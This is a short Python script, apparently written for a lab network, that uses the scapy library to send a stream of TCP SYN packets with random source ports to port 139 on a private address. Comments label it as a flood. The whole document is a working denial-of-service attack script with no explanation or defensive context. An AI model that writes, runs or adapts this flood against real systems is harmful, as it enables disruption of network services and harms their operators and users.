import sys
from scapy.all import *

target = "10.0.3.15"
dest_port = 139
flood_rate = 0.2

# set large TTL
ip_layer = IP(dst = target, ttl = 200)

# build SYN packet with random source port
tcp_layer = TCP(sport = RandShort(), dport = 139, flags = "S")

packet = ip_layer/tcp_layer

# begin flood
ans, unans = srloop(packet, inter = flood_rate, retry = 3, timeout = 5)

